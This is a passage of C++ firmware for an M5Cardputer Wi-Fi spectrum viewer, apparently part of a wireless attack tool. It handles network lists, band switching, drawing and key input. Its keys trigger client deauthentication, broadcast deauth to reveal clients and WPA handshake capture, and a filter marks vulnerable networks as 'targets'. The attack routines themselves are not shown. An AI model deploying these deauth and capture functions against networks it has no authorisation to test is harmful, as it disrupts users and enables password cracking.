        const SpectrumNetwork& net = networks[i];
        if (net.rssi < minRssi) {
            continue;
        }

        bool collapseKey = collapse && !net.isHidden && net.ssid[0] != 0;
        if (collapseKey) {
            int mergeIdx = -1;
            for (uint16_t j = 0; j < mergeSsidCount; j++) {
                if (mergeSsidKeys[j][0] == '\0') continue;
                if (strncmp(mergeSsidKeys[j], net.ssid, 32) == 0) {
                    mergeIdx = (int)j;
                    break;
                }
            }
            if (mergeIdx < 0) {
                if (mergeSsidCount < MAX_SPECTRUM_NETWORKS) {
                    mergeIdx = mergeSsidCount++;
                    strncpy(mergeSsidKeys[mergeIdx], net.ssid, 32);
                    mergeSsidKeys[mergeIdx][32] = 0;
                    memcpy(mergeSsidBssid[mergeIdx], net.bssid, 6);
                    mergeSsidRssi[mergeIdx] = net.rssi;
                    mergeSsidLastSeen[mergeIdx] = net.lastSeen;
                } else {
                    collapseKey = false;
                }
            } else {
                if (memcmp(mergeSsidBssid[mergeIdx], net.bssid, 6) == 0) {
                    mergeSsidRssi[mergeIdx] = net.rssi;
                    mergeSsidLastSeen[mergeIdx] = net.lastSeen;
                } else {
                    bool stale = (now - mergeSsidLastSeen[mergeIdx]) > staleMs;
                    bool stronger = net.rssi >= (int)(mergeSsidRssi[mergeIdx] + MERGE_HYSTERESIS_DB);
                    if (stale || stronger) {
                        memcpy(mergeSsidBssid[mergeIdx], net.bssid, 6);
                        mergeSsidRssi[mergeIdx] = net.rssi;
                        mergeSsidLastSeen[mergeIdx] = net.lastSeen;
                    }
                }
            }
            if (collapseKey) {
                if (mergeIdx < 0) {
                    continue;
                }
                if (memcmp(mergeSsidBssid[mergeIdx], net.bssid, 6) != 0) {
                    continue;
                }
            }
        }

        if (count >= MAX_SPECTRUM_NETWORKS) {
            continue;
        }

        SpectrumRenderNet& out = renderNets[count];
        memcpy(out.bssid, net.bssid, 6);
        out.channel = net.channel;
        out.rssi = net.rssi;
        out.authmode = net.authmode;
        out.hasPMF = net.hasPMF;
        out.isHidden = net.isHidden;
        out.displayFreqMHz = net.displayFreqMHz;
        count++;
    }
    renderCount = (uint16_t)count;

    // Selected snapshot for status bar + highlight
    renderSelected.valid = false;
    if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
        const SpectrumNetwork& net = networks[selectedIndex];
        renderSelected.valid = true;
        memcpy(renderSelected.bssid, net.bssid, 6);
        strncpy(renderSelected.ssid, net.ssid, 32);
        renderSelected.ssid[32] = 0;
        renderSelected.channel = net.channel;
        renderSelected.rssi = net.rssi;
        renderSelected.authmode = net.authmode;
        renderSelected.hasPMF = net.hasPMF;
        renderSelected.wasRevealed = net.wasRevealed;
    }

    // Monitored snapshot for client overlay (no live vector access in draw)
    renderMonitor.valid = false;
    renderMonitor.clientCount = 0;
    if (monitoringNetwork &&
        monitoredNetworkIndex >= 0 &&
        monitoredNetworkIndex < (int)networks.size() &&
        macEqual(networks[monitoredNetworkIndex].bssid, monitoredBSSID)) {
        const SpectrumNetwork& net = networks[monitoredNetworkIndex];
        renderMonitor.valid = true;
        memcpy(renderMonitor.bssid, net.bssid, 6);
        strncpy(renderMonitor.ssid, net.ssid, 32);
        renderMonitor.ssid[32] = 0;
        renderMonitor.channel = net.channel;
        renderMonitor.rssi = net.rssi;
        uint8_t countClients = net.clientCount;
        if (countClients > MAX_SPECTRUM_CLIENTS) countClients = MAX_SPECTRUM_CLIENTS;
        renderMonitor.clientCount = countClients;
        if (countClients > 0) {
            memcpy(renderMonitor.clients, net.clients, countClients * sizeof(SpectrumClient));
        }
    }

    busy = false;
}

bool SpectrumMode::has5GHzScanData() {
    if (!JanusHog::isConnected()) return false;
    NetworkRecon::CriticalSection lock;
    const auto& recon = NetworkRecon::getNetworks();
    for (size_t i = 0; i < recon.size(); i++) {
        if (recon[i].channel > 14) return true;
    }
    return false;
}

void SpectrumMode::setViewBand(SpectrumBand band) {
    if (viewBand == band) return;

    // Persist current viewport for the band we're leaving.
    if (viewBand == SpectrumBand::BAND_24) {
        viewCenter24MHz = viewCenterMHz;
        viewWidth24MHz = viewWidthMHz;
    } else {
        viewCenter5MHz = viewCenterMHz;
        viewWidth5MHz = viewWidthMHz;
    }

    viewBand = band;
    if (viewBand == SpectrumBand::BAND_24) {
        viewCenterMHz = viewCenter24MHz;
        viewWidthMHz = viewWidth24MHz;
        // Ensure 2.4GHz bounds are sane.
        viewCenterMHz = constrain(viewCenterMHz, MIN_CENTER_MHZ, MAX_CENTER_MHZ);
    } else {
        viewCenterMHz = viewCenter5MHz;
        viewWidthMHz = viewWidth5MHz;
        // Clamp center so the viewport stays within the displayed 5GHz band.
        viewCenterMHz = clampCenter5GHz(viewCenterMHz, viewWidthMHz);
        viewCenter5MHz = viewCenterMHz;
        viewWidth5MHz = viewWidthMHz;
    }

    // Any modal prompt should close on band switch.
    actionPromptActive = false;
}

int SpectrumMode::findC5IndexByBssid(const uint8_t* bssid) {
    if (!bssid) return -1;
    for (uint16_t i = 0; i < renderCount; i++) {
        if (memcmp(renderNets[i].bssid, bssid, 6) == 0) {
            return (int)i;
        }
    }
    return -1;
}

int SpectrumMode::findNextC5Index(int startIndex, int direction) {
    int total = (int)renderCount;
    if (total <= 0) return -1;
    if (direction == 0) return -1;
    direction = (direction > 0) ? 1 : -1;

    int idx = startIndex;
    if (idx < 0 || idx >= total) {
        idx = (direction > 0) ? -1 : total;
    }

    for (int step = 0; step < total; step++) {
        idx += direction;
        if (idx < 0) idx = total - 1;
        if (idx >= total) idx = 0;

        const SpectrumRenderNet& net = renderNets[idx];
        if (!matchesFilterRender(net)) continue;
        return idx;
    }

    return -1;
}

void SpectrumMode::handleInput() {
    // [P11] Single state check at TOP - no fall-through!
    if (monitoringNetwork) {
        handleClientMonitorInput();
        return;
    }

    if (actionPromptActive) {
        handleActionPromptInput();
        return;
    }
    
    bool anyPressed = M5Cardputer.Keyboard.isPressed();
    
    if (!anyPressed) {
        keyWasPressed = false;
        return;
    }
    
    if (keyWasPressed) return;
    keyWasPressed = true;
    
    Display::resetDimTimer();
    
    auto keys = M5Cardputer.Keyboard.keysState();
    bool has5G = has5GHzScanData();
    
    // Pan spectrum with , (left) and / (right)
    if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        if (viewBand == SpectrumBand::BAND_24) {
            viewCenterMHz = fmax(MIN_CENTER_MHZ, viewCenterMHz - PAN_STEP_MHZ);
            viewCenter24MHz = viewCenterMHz;
        } else {
            float half = viewWidthMHz * 0.5f;
            float leftEdge = viewCenterMHz - half;
            if (leftEdge <= (BAND5_MIN_MHZ + 0.01f)) {
                // Wrap from 5GHz → 2.4GHz (seamless band scroll)
                setViewBand(SpectrumBand::BAND_24);
                viewCenterMHz = MAX_CENTER_MHZ;
                viewCenter24MHz = viewCenterMHz;
                Display::showToast("2.4GHZ");
            } else {
                viewCenterMHz = clampCenter5GHz(viewCenterMHz - PAN_STEP5_MHZ, viewWidthMHz);
                viewCenter5MHz = viewCenterMHz;
            }
        }
    }
    if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        if (viewBand == SpectrumBand::BAND_24) {
            float next = viewCenterMHz + PAN_STEP_MHZ;
            if (next > MAX_CENTER_MHZ) {
                if (JanusHog::isConnected()) {
                    // Wrap from 2.4GHz → 5GHz (scan-backed)
                    setViewBand(SpectrumBand::BAND_5);
                    // Start at the left edge of the 5GHz band, respecting viewport width.
                    viewCenterMHz = clampCenter5GHz(BAND5_MIN_MHZ + viewWidthMHz * 0.5f, viewWidthMHz);
                    viewCenter5MHz = viewCenterMHz;
                    Display::showToast("5GHZ");
                    // Ensure we kick off a scan if none has happened yet.
                    if (!has5G && JanusHog::getScanCount() == 0 && JanusHog::getCurrentOp() == C5Op::NONE) {
                        JanusHog::requestScan();
                    }
                } else {
                    viewCenterMHz = MAX_CENTER_MHZ;
                    viewCenter24MHz = viewCenterMHz;
                }
            } else {
                viewCenterMHz = fmin(MAX_CENTER_MHZ, next);
                viewCenter24MHz = viewCenterMHz;
            }
        } else {
            viewCenterMHz = clampCenter5GHz(viewCenterMHz + PAN_STEP5_MHZ, viewWidthMHz);
            viewCenter5MHz = viewCenterMHz;
        }
    }
    
    // F key: cycle filter mode
    if (M5Cardputer.Keyboard.isKeyPressed('f') || M5Cardputer.Keyboard.isKeyPressed('F')) {
        filter = static_cast<SpectrumFilter>((static_cast<int>(filter) + 1) % 4);
        if (viewBand == SpectrumBand::BAND_24) {
            // If selected network no longer matches filter, find first matching
            if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
                if (!matchesFilter(networks[selectedIndex])) {
                    selectedIndex = -1;
                    for (size_t i = 0; i < networks.size(); i++) {
                        if (matchesFilter(networks[i])) {
                            selectedIndex = (int)i;
                            viewCenterMHz = channelToFreq(networks[i].channel);
                            viewCenter24MHz = viewCenterMHz;
                            break;
                        }
                    }
                }
            }
        } else {
            // 5GHz selection: keep selection if it still matches, otherwise pick next match.
            bool keepSelection = false;
            if (selectedC5Valid) {
                int idx = findC5IndexByBssid(selectedC5Bssid);
                if (idx >= 0) {
                    selectedC5Index = idx;
                    keepSelection = matchesFilterRender(renderNets[idx]);
                } else {
                    selectedC5Valid = false;
                    selectedC5Index = -1;
                    memset(selectedC5Bssid, 0, sizeof(selectedC5Bssid));
                }
            }

            if (!keepSelection) {
                int next = findNextC5Index(selectedC5Index, +1);
                if (next >= 0) {
                    selectedC5Index = next;
                    memcpy(selectedC5Bssid, renderNets[next].bssid, 6);
                    selectedC5Valid = true;
                    viewCenterMHz = clampCenter5GHz(channelToFreq(renderNets[next].channel), viewWidthMHz);
                    viewCenter5MHz = viewCenterMHz;
                } else {
                    selectedC5Valid = false;
                    selectedC5Index = -1;
                    memset(selectedC5Bssid, 0, sizeof(selectedC5Bssid));
                }
            }
        }
    }
    
    // Cycle through matching networks with ; and .
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        if (viewBand == SpectrumBand::BAND_24 && !networks.empty()) {
            int startIdx = selectedIndex;
            int count = 0;
            do {
                selectedIndex = (selectedIndex - 1 + (int)networks.size()) % (int)networks.size();
                count++;
            } while (!matchesFilter(networks[selectedIndex]) && count < (int)networks.size());
            
            if (!matchesFilter(networks[selectedIndex])) {
                selectedIndex = startIdx;  // No match found, stay put
            } else if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
                viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
                viewCenter24MHz = viewCenterMHz;
            }
        } else if (viewBand == SpectrumBand::BAND_5) {
            int next = findNextC5Index(selectedC5Index, -1);
            if (next >= 0) {
                selectedC5Index = next;
                memcpy(selectedC5Bssid, renderNets[next].bssid, 6);
                selectedC5Valid = true;
                viewCenterMHz = clampCenter5GHz(channelToFreq(renderNets[next].channel), viewWidthMHz);
                viewCenter5MHz = viewCenterMHz;
            }
        }
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        if (viewBand == SpectrumBand::BAND_24 && !networks.empty()) {
            int startIdx = selectedIndex;
            int count = 0;
            do {
                selectedIndex = (selectedIndex + 1) % (int)networks.size();
                count++;
            } while (!matchesFilter(networks[selectedIndex]) && count < (int)networks.size());
            
            if (!matchesFilter(networks[selectedIndex])) {
                selectedIndex = startIdx;  // No match found, stay put
            } else if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
                viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
                viewCenter24MHz = viewCenterMHz;
            }
        } else if (viewBand == SpectrumBand::BAND_5) {
            int next = findNextC5Index(selectedC5Index, +1);
            if (next >= 0) {
                selectedC5Index = next;
                memcpy(selectedC5Bssid, renderNets[next].bssid, 6);
                selectedC5Valid = true;
                viewCenterMHz = clampCenter5GHz(channelToFreq(renderNets[next].channel), viewWidthMHz);
                viewCenter5MHz = viewCenterMHz;
            }
        }
    }
    
    // Enter: start monitoring selected network
    if (keys.enter) {
        if (viewBand == SpectrumBand::BAND_24) {
            if (!networks.empty() && selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
                enterClientMonitor();
            }
        } else {
            if (!has5G) {
                Display::showToast("NO 5G DATA");
                return;
            }

            // Ensure we have a valid selection.
            if (selectedC5Valid) {
                int idx = findC5IndexByBssid(selectedC5Bssid);
                if (idx >= 0) {
                    selectedC5Index = idx;
                } else {
                    selectedC5Valid = false;
                    selectedC5Index = -1;
                    memset(selectedC5Bssid, 0, sizeof(selectedC5Bssid));
                }
            }
            if (!selectedC5Valid) {
                int idx = findNextC5Index(-1, +1);
                if (idx >= 0) {
                    selectedC5Index = idx;
                    memcpy(selectedC5Bssid, renderNets[idx].bssid, 6);
                    selectedC5Valid = true;
                    viewCenterMHz = clampCenter5GHz(channelToFreq(renderNets[idx].channel), viewWidthMHz);
                    viewCenter5MHz = viewCenterMHz;
                }
            }

            if (selectedC5Valid && selectedC5Index >= 0 && selectedC5Index < (int)renderCount) {
                const SpectrumRenderNet& rn = renderNets[selectedC5Index];
                memcpy(actionBssid, rn.bssid, 6);

                // Pull SSID and latest metadata from recon (scan cache may not include all persisted nets).
                DetectedNetwork dn = {};
                if (NetworkRecon::findNetwork(rn.bssid, &dn) && dn.channel > 14) {
                    strncpy(actionSsid, dn.ssid, 32);
                    actionSsid[32] = 0;
                    actionChannel = dn.channel;
                    actionRssi = dn.rssi;
                    actionAuthmode = dn.authmode;
                } else {
                    actionSsid[0] = 0;
                    actionChannel = rn.channel;
                    actionRssi = rn.rssi;
                    actionAuthmode = rn.authmode;
                }
                actionPromptActive = true;
            } else {
                Display::showToast("NO 5G NETS");
            }
        }
    }
    
    // Space: toggle dial lock when in dial mode
    if (M5Cardputer.Keyboard.isKeyPressed(' ') && dialMode && viewBand == SpectrumBand::BAND_24) {
        dialLocked = !dialLocked;
        SFX::play(SFX::CLICK);
    }
}

void SpectrumMode::handleActionPromptInput() {
    bool anyPressed = M5Cardputer.Keyboard.isPressed();
    if (!anyPressed) {
        keyWasPressed = false;
        return;
    }
    if (keyWasPressed) return;
    keyWasPressed = true;

    Display::resetDimTimer();
    auto keys = M5Cardputer.Keyboard.keysState();

    // Backspace or Enter: close prompt
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || keys.enter) {
        actionPromptActive = false;
        return;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('h') || M5Cardputer.Keyboard.isKeyPressed('H')) {
        actionPromptActive = false;
        if (!JanusHog::isConnected()) {
            Display::showToast("C5 OFFLINE");
            return;
        }
        // Start handshake capture on C5.
        if (JanusHog::requestHandshake(actionBssid)) {
            c5HandshakePending = true;
            c5HandshakeStartMs = millis();
            strncpy(c5HandshakeSsid, actionSsid, 32);
            c5HandshakeSsid[32] = 0;
            Display::notify(NoticeKind::STATUS, "C5 HANDSHAKE", 2000, NoticeChannel::TOP_BAR);
        } else {
            Display::showToast("C5 BUSY");
        }
        return;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('p') || M5Cardputer.Keyboard.isKeyPressed('P')) {
        actionPromptActive = false;
        if (!JanusHog::isConnected()) {
            Display::showToast("C5 OFFLINE");
            return;
        }
        if (JanusHog::requestPacketMonitor(actionChannel)) {
            Display::notify(NoticeKind::STATUS, "C5 PKT MON", 2000, NoticeChannel::TOP_BAR);
        } else {
            Display::showToast("C5 BUSY");
        }
        return;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')) {
        actionPromptActive = false;
        bool ok = OinkMode::excludeNetworkByBSSID(actionBssid, actionSsid);
        Display::showToast(ok ? "BOAR BRO" : "ALREADY BRO");
        return;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
        actionPromptActive = false;
        if (JanusHog::isConnected()) {
            JanusHog::requestStop();
            Display::showToast("C5 STOP");
        } else {
            Display::showToast("C5 OFFLINE");
        }
        return;
    }

    // Any other key closes prompt (avoids modal trap).
    actionPromptActive = false;
}

void SpectrumMode::drawActionPrompt(M5Canvas& canvas, uint16_t fg, uint16_t bg) {
    const int boxX = 6;
    const int boxW = canvas.width() - (boxX * 2);
    const int lineH = 10;
    const int boxH = (lineH * 4) + 10;
    const int boxY = canvas.height() - boxH - 4;

    canvas.fillRect(boxX, boxY, boxW, boxH, bg);
    canvas.drawRect(boxX, boxY, boxW, boxH, fg);

    canvas.setTextSize(1);
    canvas.setTextColor(fg);

    // Title (SSID)
    char title[34];
    if (actionSsid[0]) {
        strncpy(title, actionSsid, 32);
        title[32] = 0;
    } else {
        strncpy(title, "<HIDDEN>", sizeof(title) - 1);
        title[sizeof(title) - 1] = 0;
    }
    // Uppercase for readability
    for (uint8_t i = 0; title[i]; i++) {
        title[i] = (char)toupper((unsigned char)title[i]);
    }
    if (strlen(title) > 22) {
        title[22] = 0;
        title[20] = '.';
        title[21] = '.';
    }

    canvas.setTextDatum(top_left);
    const int textX = boxX + 6;
    const int textY = boxY + 4;
    canvas.drawString(title, textX, textY);

    char meta[32];
    snprintf(meta, sizeof(meta), "CH:%u %ddB %s", actionChannel, actionRssi, authModeToShortString(actionAuthmode));
    canvas.drawString(meta, textX, textY + lineH);

    canvas.drawString("[H]HS  [P]MON  [B]BRO", textX, textY + (lineH * 2));
    canvas.drawString("[S]STOP  [BK]EXIT", textX, textY + (lineH * 3));
}

// Handle input when in client monitor overlay [P11] [P13] [P14]
void SpectrumMode::handleClientMonitorInput() {
    bool anyPressed = M5Cardputer.Keyboard.isPressed();
    
    if (!anyPressed) {
        keyWasPressed = false;
        return;
    }
    
    if (keyWasPressed) return;
    keyWasPressed = true;
    
    Display::resetDimTimer();
    
    // If detail popup is active, any key closes it
    if (clientDetailActive) {
        clientDetailActive = false;
        return;
    }
    
    // If revealing, any key exits reveal mode
    if (revealingClients) {
        exitRevealMode();
        return;
    }
    
    // W key: enter reveal mode (broadcast deauth to discover clients)
    if (M5Cardputer.Keyboard.isKeyPressed('w') || M5Cardputer.Keyboard.isKeyPressed('W')) {
        enterRevealMode();
        return;
    }
    
    // Backspace - go back
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        exitClientMonitor();
        return;
    }
    
    // B key: add to BOAR BROS and exit [P13]
    if (M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')) {
        if (monitoredNetworkIndex >= 0 && 
            monitoredNetworkIndex < (int)networks.size()) {
            // Add to BOAR BROS via OinkMode
            OinkMode::excludeNetworkByBSSID(networks[monitoredNetworkIndex].bssid,
                                             networks[monitoredNetworkIndex].ssid);
            Display::showToast("EXCLUDED - RETURNING");
            delay(500);
            exitClientMonitor();
        }
        return;
    }
    
    // Get client count safely [P14]
    int clientCount = 0;
    if (monitoredNetworkIndex >= 0 && 
        monitoredNetworkIndex < (int)networks.size()) {
        clientCount = networks[monitoredNetworkIndex].clientCount;
    }
    
    // Navigation only if clients exist [P14]
    if (clientCount > 0) {
        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            selectedClientIndex = max(0, selectedClientIndex - 1);
            // Adjust scroll if needed
            if (selectedClientIndex < clientScrollOffset) {
                clientScrollOffset = selectedClientIndex;
            }
        }
        
        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            selectedClientIndex = min(clientCount - 1, selectedClientIndex + 1);
            // Adjust scroll if needed
            if (selectedClientIndex >= clientScrollOffset + VISIBLE_CLIENTS) {
                clientScrollOffset = selectedClientIndex - VISIBLE_CLIENTS + 1;
            }
        }
        
        // D key: show client detail popup
        if (M5Cardputer.Keyboard.isKeyPressed('d') || M5Cardputer.Keyboard.isKeyPressed('D')) {
            if (selectedClientIndex >= 0 && selectedClientIndex < clientCount) {
                // Store MAC of client we're viewing - close popup if this client disappears
                memcpy(detailClientMAC, networks[monitoredNetworkIndex].clients[selectedClientIndex].mac, 6);
                clientDetailActive = true;
            }
            return;
        }
        
        // Enter: deauth selected client [P14]
        if (M5Cardputer.Keyboard.keysState().enter) {
            deauthClient(selectedClientIndex);
        }
    }
}

void SpectrumMode::draw(M5Canvas& canvas) {
    // Cache theme colors once per frame (eliminates ~19K redundant function calls in worst case)
    const uint16_t fg = getColorFG();
    const uint16_t bg = getColorBG();

    canvas.fillSprite(bg);

    // Draw client overlay when monitoring, otherwise spectrum
    if (monitoringNetwork) {
        drawClientOverlay(canvas, fg, bg);
    } else {
        // Draw spectrum visualization
        drawAxis(canvas, fg);
        drawNoiseFloor(canvas, fg);
        drawSpectrum(canvas, fg, bg);
        drawWaterfall(canvas, fg);
        drawChannelMarkers(canvas, fg, bg);
        drawFilterBar(canvas, fg);

        // Draw dial mode info (when device upright)
        drawDialInfo(canvas, fg);

        // Draw status indicators if network is selected
        if (renderSelected.valid) {
            canvas.setTextSize(1);
            canvas.setTextColor(fg);
            canvas.setTextDatum(top_left);

            // Build status string without heap churn
            char status[24];
            size_t pos = 0;
            status[0] = '\0';
            if (isVulnerable(renderSelected.authmode)) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[VULN!]");
            }
            if (!renderSelected.hasPMF) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[DEAUTH]");
            }
            if (OinkMode::isExcluded(renderSelected.bssid)) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[BRO]");
            }
            if (pos > 0) {
                canvas.drawString(status, SPECTRUM_LEFT + 2, SPECTRUM_TOP);
            }
        }

        if (actionPromptActive) {
            drawActionPrompt(canvas, fg, bg);
        }
    }

    // XP now shows in top bar on gain (Option B)
}

void SpectrumMode::drawAxis(M5Canvas& canvas, uint16_t fg) {
    // Y-axis line
    canvas.drawFastVLine(SPECTRUM_LEFT - 2, SPECTRUM_TOP, SPECTRUM_BOTTOM - SPECTRUM_TOP, fg);

    // dB labels on left
    canvas.setTextSize(1);
    canvas.setTextColor(fg);
    canvas.setTextDatum(middle_right);

    for (int8_t rssi = -30; rssi >= -90; rssi -= 20) {
        int y = rssiToY(rssi);
        int labelY = (y < 6) ? 6 : y;
        canvas.drawFastHLine(SPECTRUM_LEFT - 4, y, 3, fg);
        char rssiLabel[6];
        snprintf(rssiLabel, sizeof(rssiLabel), "%d", rssi);
        canvas.drawString(rssiLabel, SPECTRUM_LEFT - 5, labelY);
    }

    // Baseline
    canvas.drawFastHLine(SPECTRUM_LEFT, SPECTRUM_BOTTOM, SPECTRUM_RIGHT - SPECTRUM_LEFT, fg);
}

void SpectrumMode::drawChannelMarkers(M5Canvas& canvas, uint16_t fg, uint16_t bg) {
    canvas.setTextSize(1);
    canvas.setTextColor(fg);
    canvas.setTextDatum(top_center);

    if (viewBand == SpectrumBand::BAND_24) {
        // ==[ DIAL MODE: SLIDING HIGHLIGHT BOX ]==
        // Draw BEFORE channel numbers so numbers appear inverted on top
        if (dialMode) {
            // Calculate X position from smooth dial position
            float clampedPos = constrain(dialPositionSmooth, 1.0f, 13.0f);
            float freq = 2412.0f + (clampedPos - 1.0f) * 5.0f;
            int xCenter = freqToX(freq);

            int boxW = 14;
            int boxH = 10;
            int boxY = CHANNEL_LABEL_Y - 1;
            int boxX = xCenter - boxW / 2;

            canvas.fillRect(boxX, boxY, boxW, boxH, fg);
            if (dialLocked) {
                canvas.drawRect(boxX - 1, boxY - 1, boxW + 2, boxH + 2, fg);
            }
        }

        // Draw channel numbers for visible channels
        for (uint8_t ch = 1; ch <= 13; ch++) {
            float freq = channelToFreq(ch);
            int x = freqToX(freq);
            if (x < SPECTRUM_LEFT || x > SPECTRUM_RIGHT) continue;

            canvas.drawFastVLine(x, SPECTRUM_BOTTOM, 3, fg);

            bool isDialSelected = dialMode && (fabsf(dialPositionSmooth - (float)ch) < 0.6f);
            canvas.setTextColor(isDialSelected ? bg : fg);

            char chLabel[4];
            snprintf(chLabel, sizeof(chLabel), "%u", ch);
            canvas.drawString(chLabel, x, CHANNEL_LABEL_Y);
        }
        canvas.setTextColor(fg);
        
        // Scroll indicators (2.4GHz panning)
        float leftEdge = viewCenterMHz - viewWidthMHz / 2;
        float rightEdge = viewCenterMHz + viewWidthMHz / 2;
        canvas.setTextDatum(middle_left);
        if (leftEdge > 2407) {
            canvas.drawString("<", 2, SPECTRUM_BOTTOM / 2);
        }
        canvas.setTextDatum(middle_right);
        if (rightEdge < 2477) {
            canvas.drawString(">", SPECTRUM_RIGHT + 1, SPECTRUM_BOTTOM / 2);
        }
    } else {
        // 5GHz band ticks (common 20MHz centers)
        static const uint8_t ch5List[] = {
            36, 40, 44, 48, 52, 56, 60, 64,
            100, 104, 108, 112, 116, 120, 124, 128,
            132, 136, 140, 144, 149, 153, 157, 161, 165
        };
        
        int lastLabelX = -9999;
        for (uint8_t i = 0; i < sizeof(ch5List); i++) {
            uint8_t ch = ch5List[i];
            float freq = channelToFreq(ch);
            int x = freqToX(freq);
            if (x < SPECTRUM_LEFT || x > SPECTRUM_RIGHT) continue;
            
            canvas.drawFastVLine(x, SPECTRUM_BOTTOM, 3, fg);

            // Label only when there's space to avoid overlap.
            if ((x - lastLabelX) >= 24 || ch == 165) {
                char lbl[4];
                snprintf(lbl, sizeof(lbl), "%u", ch);
                canvas.drawString(lbl, x, CHANNEL_LABEL_Y);
                lastLabelX = x;
            }
        }
        
        float leftEdge = viewCenterMHz - viewWidthMHz / 2;
        float rightEdge = viewCenterMHz + viewWidthMHz / 2;
        canvas.setTextDatum(middle_left);
        if (leftEdge > BAND5_MIN_MHZ) {
            canvas.drawString("<", 2, SPECTRUM_BOTTOM / 2);
        }
        canvas.setTextDatum(middle_right);
        if (rightEdge < BAND5_MAX_MHZ) {
            canvas.drawString(">", SPECTRUM_RIGHT + 1, SPECTRUM_BOTTOM / 2);
        }
    }
    
    canvas.setTextDatum(top_center);
}

// Draw filter indicator bar at Y=91 (old XP bar area)
void SpectrumMode::drawFilterBar(M5Canvas& canvas, uint16_t fg) {
    // Count networks matching current filter:
    // - denom = total matches in band (ignores min RSSI)
    // - numer = matches that should actually render in the current viewport (min RSSI + intersects view)
    int matchTotal = 0;
    int matchInView = 0;

    int minRssi = Config::wifi().spectrumMinRssi;
    if (minRssi < RSSI_MIN) minRssi = RSSI_MIN;
    if (minRssi > RSSI_MAX) minRssi = RSSI_MAX;

    float viewLeft = viewCenterMHz - (viewWidthMHz * 0.5f);
    float viewRight = viewCenterMHz + (viewWidthMHz * 0.5f);
    const float SINC_HALF_WIDTH = 22.0f;  // Must match drawGaussianLobe() range

    if (viewBand == SpectrumBand::BAND_24) {
        for (const auto& net : networks) {
            if (!matchesFilter(net)) continue;
            matchTotal++;

            if (net.rssi < minRssi) continue;
            float c = net.displayFreqMHz;
            bool intersects = (c + SINC_HALF_WIDTH >= viewLeft) && (c - SINC_HALF_WIDTH <= viewRight);
            if (intersects) matchInView++;
        }
    } else {
        NetworkRecon::CriticalSection lock;
        const auto& recon = NetworkRecon::getNetworks();
        for (size_t i = 0; i < recon.size(); i++) {
            const DetectedNetwork& net = recon[i];
            if (net.channel <= 14) continue;

            SpectrumRenderNet tmp = {};
            tmp.channel = net.channel;
            tmp.rssi = net.rssi;
            tmp.authmode = net.authmode;
            tmp.hasPMF = true;  // Unknown on 5GHz scan output; don't advertise deauthability.
            tmp.isHidden = net.isHidden || (net.ssid[0] == '\0');
            if (!matchesFilterRender(tmp)) continue;
            matchTotal++;

            if (net.rssi < minRssi) continue;
            float c = channelToFreq(net.channel);
            bool intersects = (c + SINC_HALF_WIDTH >= viewLeft) && (c - SINC_HALF_WIDTH <= viewRight);
            if (intersects) matchInView++;
        }
    }
    
    canvas.setTextSize(1);
    canvas.setTextColor(fg);
    canvas.setTextDatum(top_left);

    // Build filter status string
    char buf[40];
    const char* filterName;
    const char* suffix;
    
    switch (filter) {
        case SpectrumFilter::VULN:
            filterName = "VULN";
            suffix = matchTotal == 1 ? "TARGET" : "TARGETS";
            break;
        case SpectrumFilter::SOFT:
            filterName = "SOFT";
            suffix = matchTotal == 1 ? "TARGET" : "TARGETS";
            break;
        case SpectrumFilter::HIDDEN:
            filterName = "HIDDEN";
            suffix = "FOUND";
            break;
        case SpectrumFilter::ALL:
        default:
            filterName = "ALL";
            suffix = matchTotal == 1 ? "AP" : "APs";
            break;
    }
    
    snprintf(buf, sizeof(buf), "[F] %s: %d/%d %s", filterName, matchInView, matchTotal, suffix);
    canvas.drawString(buf, 2, XP_BAR_Y);
    
    // Stress test indicator (right side)
    if (StressTest::isActive()) {
        char stressBuf[24];
        snprintf(stressBuf, sizeof(stressBuf), "[T] STRESS %lu/s", StressTest::getRate());
        canvas.setTextDatum(top_right);
        canvas.drawString(stressBuf, 238, XP_BAR_Y);
        canvas.setTextDatum(top_left);
    }
    // 5GHz availability/count (right side, if no stress test)
    else if (has5GHzScanData()) {
        uint16_t cnt5 = 0;
        {
            NetworkRecon::CriticalSection lock;
            const auto& recon = NetworkRecon::getNetworks();
            for (size_t i = 0; i < recon.size(); i++) {
                if (recon[i].channel > 14) cnt5++;
            }
        }
        char c5Buf[16];
        if (viewBand == SpectrumBand::BAND_5) {
            snprintf(c5Buf, sizeof(c5Buf), "R>%d", minRssi);
        } else {
            snprintf(c5Buf, sizeof(c5Buf), "5G:%u", (unsigned)cnt5);
        }
        canvas.setTextDatum(top_right);
        canvas.setTextColor(fg);  // COLOR_ACCENT == COLOR_FG
        canvas.drawString(c5Buf, 238, XP_BAR_Y);
        canvas.setTextDatum(top_left);
        canvas.setTextColor(fg);
    }
}

// Draw dial mode info bar (top-right when device upright)
void SpectrumMode::drawDialInfo(M5Canvas& canvas, uint16_t fg) {
    if (!dialMode && !renderSelected.valid) return;
    
    // Show channel info at top-right, above spectrum
    int infoY = 4;  // top margin
    
    char info[32];
    uint8_t channel = dialMode ? dialChannel : renderSelected.channel;
    const char* prefix = dialMode ? (dialLocked ? "LCK" : "CH") : "SEL";
